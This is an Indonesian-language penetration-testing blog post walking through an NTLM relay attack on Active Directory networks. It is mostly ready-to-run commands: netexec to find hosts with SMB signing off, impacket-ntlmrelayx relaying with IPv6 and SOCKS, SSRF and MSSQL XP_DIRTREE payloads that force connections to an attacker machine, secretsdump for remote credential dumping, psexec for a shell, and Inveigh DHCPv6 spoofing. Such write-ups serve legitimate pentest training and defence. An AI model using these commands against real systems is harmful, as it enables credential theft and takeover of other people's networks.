---
title: NTLM Relay IPv6 Attack
author: "novran"
date: 2024-11-23 00:00:00 +0700
categories: [Active Directory Pentest]
tags: [Active Directory Pentest]
mermaid: true
image:
  path: /images/2024-11-23-ntlm-relay-attack-banner.png
  alt: NTLM Relay Attack
---

Ketika pengaturan `Signing` pada protokol SMB (Server Message Block) memiliki pengaturan `False` atau dinonaktifkan, maka data yang dikirim antar klien dan server tidak diverifikasi. Sehingga komputer yang menjalankan konfigurasi **SMB Signing False** akan rentan terhadap serangan **NTLM Relay**.

# Let's Do It

```bash
netexec smb <IP_SEGMENT>/24 --gen-relay-list vuln-ntlm.txt
```

![Netexec Detect All Vulnerable Hosts](/images/2024-11-23-ntlm-relay-attack-vulnerable-host.png)

## 1. Wait and See or Trigger It

```bash
sudo impacket-ntlmrelayx -tf vuln-ntlm.txt -smb2support --ipv6 -debug
```

![NTLMRelayX](/images/2024-11-23-ntlm-relay-attack-ntlmrelayx.png)

Pada dasarnya, karena ini adalah serangan Man-in-the-Middle, maka **kalian hanya perlu menunggu saja** dan berharap **ada Host yang melakukan Broadcast** melalui LLMNR/mDNS.

> Namun, jika kalian menemukan kerentanan yang bisa di-**chaining**, seperti SSRF atau mendapatkan akses MSSQL, kalian bisa langsung men-trigger-nya secara langsung, dengan cara mengakses ke mesin kalian secara langsung (menggunakan protokol SMB).

**Trigger It!**

Server-Side Request Forgery.

```
file://<ATTACKER_MACHINE>/attack
```

MSSQL Query.

```
XP_DIRTREE '\\<ATTACKER_MACHINE>\attack', 1, 1
```

**Credential Dumped!**

Jika berhasil, maka `impacket-ntlmrelayx` yang dijalankan tadi akan menghasilkan output seperti ini.

![SAM Pwnd!](/images/2024-11-23-ntlm-relay-attack-sam-pwnd.png)

### Optional: Create Relay as Proxy Connection (Socks)

```bash
sudo impacket-ntlmrelayx -tf vuln-ntlm.txt -smb2support --ipv6 -debug -socks
```

```bash
## add to /etc/proxychains4.conf
socks4 127.0.0.1 1080
```

**Dengan ini, kita bisa mengeksekusi mesin target menggunakan...**

```bash
## Remote Credential Dump
proxychains4 -q impacket-secretsdump 'domain.local/anyuser$':'wrongpass'@<TARGET_MACHINE>
```

Atau.

```bash
## Run Shell Session
proxychains4 -q impacket-psexec 'domain.local/anyuser$':'wrongpass'@<TARGET_MACHINE>
```

## 2. Spoof via Compromised Machine

Setelah membaca dari sumber [ini](https://cloud.tencent.com/developer/article/1956335), Kita juga dapat melakukannya meskipun kondisinya itu _cross-network_, dengan cara melakukan Spoofing menggunakan [Inveigh](https://github.com/Kevin-Robertson/Inveigh/releases/tag/v2.0.11) (dengan catatan, Spoof melalui mesin yang sudah _compromised_).

```powershell
.\Inveigh.exe -DHCPv6 Y -SpooferIP <ATTACKER_MACHINE>
```

Kurang lebih gambarannya akan seperti ini.

![Relay to SpoofIP](/images/2024-11-23-ntlm-relay-attack-by-spoof-ip.png)
